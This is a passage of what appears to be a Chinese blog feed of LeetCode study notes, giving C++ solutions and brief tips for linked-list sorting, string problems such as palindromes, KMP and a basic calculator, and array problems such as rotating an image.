class="keyword">if</span> (list1-&gt;val &lt; list2-&gt;val) &#123;</span><br><span class="line">                cur-&gt;next = list1; </span><br><span class="line">                list1 = list1-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                      </span><br><span class="line">                cur-&gt;next = list2;</span><br><span class="line">                list2 = list2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next = list1 ? list1 : list2; </span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next) cur = cur-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> &#123;dummy.next, cur&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">sortList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length = <span class="built_in">getListLength</span>(head); </span><br><span class="line">        <span class="function">ListNode <span class="title">dummy</span><span class="params">(<span class="number">0</span>, head)</span></span>;          </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> step = <span class="number">1</span>; step &lt; length; step *= <span class="number">2</span>) &#123;</span><br><span class="line">            ListNode *new_list_tail = &amp;dummy; </span><br><span class="line">            ListNode *cur = dummy.next;       </span><br><span class="line">            <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">                ListNode *head1 = cur;</span><br><span class="line">                ListNode *head2 = <span class="built_in">splitList</span>(head1, step);</span><br><span class="line">                cur = <span class="built_in">splitList</span>(head2, step); </span><br><span class="line">                <span class="keyword">auto</span> [head, tail] = <span class="built_in">mergeTwoLists</span>(head1, head2);</span><br><span class="line">                new_list_tail-&gt;next = head;</span><br><span class="line">                new_list_tail = tail; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：为什么这道题不是hard？非常难写，这里粘贴的是别人<del>(还需要掌握)</del>。主要考点是归并排序自底向上的写法，如果用的是自顶向下的写法的话会使用到栈从而让空间复杂度变为O(logn)。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(十一): 字符串</title>
      <link href="/post/82077779.html"/>
      <url>/post/82077779.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、字符串比较"><a href="#一、字符串比较" class="headerlink" title="一、字符串比较"></a>一、字符串比较</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/isomorphic-strings">同构字符串</a><br>判断两个字符串是否同构。同构的定义是，可以通过把一个字符串的某些相同的字符转换成另一些相同的字符，使得两个字符串相同，且两种不同的字符不能够被转换成同一种字符。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isIsomorphic</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hashMap;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hashMap2;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashMap[s[i]] != <span class="number">0</span> || hashMap2[t[i]] != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            hashMap[s[i]] = t[i];</span><br><span class="line">            hashMap2[t[i]] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">            s[i] = hashMap[s[i]];</span><br><span class="line">        <span class="keyword">return</span> s == t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：完完全全的一一对应关系，所以既需要正向记录也需要反向记录。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/palindromic-substrings">回文字串</a><br>给定一个字符，求其有多少个回文子字符串。回文的定义是左右对称。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">extendSubstrings</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>, n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">while</span> (l &gt;= <span class="number">0</span> &amp;&amp; r &lt; n &amp;&amp; s[l] == s[r]) &#123;</span><br><span class="line">            --l;</span><br><span class="line">            ++r;</span><br><span class="line">            ++count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); ++i) &#123;</span><br><span class="line">            count += <span class="built_in">extendSubstrings</span>(s, i, i);     </span><br><span class="line">            count += <span class="built_in">extendSubstrings</span>(s, i, i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：学会使用这种从中间往两边遍历的写法(注意要区分奇偶回文串)，还有一个时间复杂度为O(n)的<strong>Manacher算法</strong>，因为比较难以理解，所以就不在此处展示了，如想研究请自行google。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/count-binary-substrings">计数二进制子串</a><br>给定一个0-1字符串，求有多少非空子字符串的0和1数量相同，且0和1必须连续出现(比如0011、1100，但是0101不算)。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countBinarySubstrings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> stack0 = <span class="number">0</span>, stack1 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; s[i - <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    stack0 = <span class="number">0</span>;</span><br><span class="line">                ++stack0;</span><br><span class="line">                <span class="keyword">if</span> (stack1 != <span class="number">0</span>) &#123;</span><br><span class="line">                    ++count;</span><br><span class="line">                    --stack1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; s[i - <span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                    stack1 = <span class="number">0</span>;</span><br><span class="line">                ++stack1;</span><br><span class="line">                <span class="keyword">if</span> (stack0 != <span class="number">0</span>) &#123;</span><br><span class="line">                    ++count;</span><br><span class="line">                    --stack0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很容易想到使用栈结构来完成这道题，那剩下的也就只有简单的处理01连续的问题，只需要判断一下当前连续的0或者是1是否被截断了即可。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/minimum-remove-to-make-valid-parentheses">移除无效的括号</a><br>给定一个包括字母和左右括号的字符串，求最少要移除多少个括号才能使其合法。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">minRemoveToMakeValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stack;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                stack.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!stack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    stack.<span class="built_in">pop_back</span>();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                s[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> index : stack) s[index] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="string">&#x27;0&#x27;</span>) res.<span class="built_in">push_back</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：典型的栈结构题，可以参考匹配括号的那道题。这道题无非多的就是需要把多余出来的’(‘也给移除出去，用stack记录一下下标即可轻松实现。</p></li></ul><h2 id="二、字符串理解"><a href="#二、字符串理解" class="headerlink" title="二、字符串理解"></a>二、字符串理解</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/basic-calculator-ii">基本计算器 II</a><br>给定一个包含加减乘除整数运算的字符串，求其运算的整数值结果。如果除不尽则向0取整。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">char</span> op = <span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> num1 = <span class="number">0</span>, num2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; s.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                ++i;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                string temp;</span><br><span class="line">                <span class="keyword">while</span> (s[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                    temp.<span class="built_in">push_back</span>(s[i++]);</span><br><span class="line">                <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                    num1 += num2;</span><br><span class="line">                    num2 = <span class="built_in">stoi</span>(temp);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                    num1 += num2;</span><br><span class="line">                    num2 = -<span class="built_in">stoi</span>(temp);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    num2 *= <span class="built_in">stoi</span>(temp);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                    num2 /= <span class="built_in">stoi</span>(temp);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                op = s[i++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num1 + num2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：没有括号改变优先级，遍历即可，需要有点耐心，通过区分num1和num2且立马计算num2来达到乘除优先级的效果。</p></li></ul><h2 id="三、字符串匹配"><a href="#三、字符串匹配" class="headerlink" title="三、字符串匹配"></a>三、字符串匹配</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string">找出字符串中第一个匹配项的下标</a><br>判断一个字符串是不是另一个字符串的子字符串，并返回其位置。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">makeLps</span><span class="params">(string pattern)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = pattern.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">lps</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="type">int</span> maxLen = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pattern[i] == pattern[maxLen]) &#123;</span><br><span class="line">                ++maxLen;</span><br><span class="line">                lps[i++] = maxLen;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (maxLen &gt; <span class="number">0</span>) maxLen = lps[maxLen - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> lps[i++] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lps;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (needle.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; lps = <span class="built_in">makeLps</span>(needle);</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = needle.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span> (i &lt; haystack.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (haystack[i] == needle[j]) &#123;</span><br><span class="line">                ++i;</span><br><span class="line">                ++j;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) j = lps[j - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> ++i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == n) <span class="keyword">return</span> i - n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：<del>还没看懂</del>，之后还需要掌握的<strong>KMP算法</strong>，不过c++也可以直接使用<code>find()</code>方法来完成。</p></li></ul><h2 id="四、练习"><a href="#四、练习" class="headerlink" title="四、练习"></a>四、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/longest-palindrome">最长回文串</a><br>给定一个包含大写字母和小写字母的字符串s，返回通过这些字母构造成的最长的回文串的长度。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hashMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) ++hashMap[c];</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> hasOdd = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[c, count] : hashMap) &#123;</span><br><span class="line">            res += (count / <span class="number">2</span>) * <span class="number">2</span>; </span><br><span class="line">            <span class="keyword">if</span> (count % <span class="number">2</span> == <span class="number">1</span>) hasOdd = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hasOdd) ++res; </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意即使有奇数个也可以取偶数个。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters">无重复字符的最长子串</a><br>给定一个字符串s，请你找出其中不含有重复字符的最长子串的长度。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">        unordered_set&lt;<span class="type">char</span>&gt; hashSet;</span><br><span class="line">        <span class="type">int</span> maxRes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (end &lt; s.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashSet.<span class="built_in">count</span>(s[end]) != <span class="number">0</span>) &#123;</span><br><span class="line">                maxRes = <span class="built_in">max</span>(maxRes, end - start);</span><br><span class="line">                <span class="keyword">while</span> (hashSet.<span class="built_in">count</span>(s[end]) != <span class="number">0</span>) &#123;</span><br><span class="line">                    hashSet.<span class="built_in">erase</span>(s[start++]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            hashSet.<span class="built_in">emplace</span>(s[end++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(maxRes, end - start);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：并不是很难，需要记录一下出现过的字母方便进行长度截断并且重新开始。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(十): 数据结构</title>
      <link href="/post/edb775d8.html"/>
      <url>/post/edb775d8.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/find-all-numbers-disappeared-in-an-array">找到所有数组中消失的数字</a><br>给定一个长度为n的数组，其中包含范围为1到n的整数，有些整数重复了多次，有些整数没有出现，求1到n中没有出现过的整数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findDisappearedNumbers</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bucket</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) ++bucket[num - <span class="number">1</span>];</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!bucket[i])</span><br><span class="line">                res.<span class="built_in">push_back</span>(i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单不说了。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/rotate-image">旋转图像</a><br>给定一个n×n的矩阵，求它顺时针旋转90度的结果，且必须在原矩阵上修改(in-place)。怎样能够尽量不创建额外储存空间呢？<br><img src="https://assets.leetcode.com/uploads/2020/08/28/mat1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = matrix.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (n + <span class="number">1</span>) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n - i; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> temp = matrix[i][j];</span><br><span class="line">                <span class="type">int</span> temp_i = i, temp_j = j;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">3</span>; ++k) &#123;</span><br><span class="line">                    matrix[temp_i][temp_j] = matrix[n - temp_j][temp_i];</span><br><span class="line">                    <span class="type">int</span> temp2 = temp_i;</span><br><span class="line">                    temp_i = n - temp_j;</span><br><span class="line">                    temp_j = temp2;</span><br><span class="line">                &#125;</span><br><span class="line">                matrix[temp_i][temp_j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意找到旋转的数字之间的位置关系。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/search-a-2d-matrix-ii">搜索二维矩阵 II</a><br>给定一个二维矩阵，已知每行和每列都是增序的，尝试设计一个快速搜索一个数字是否在矩阵中存在的算法。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/11/25/searchgrid2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 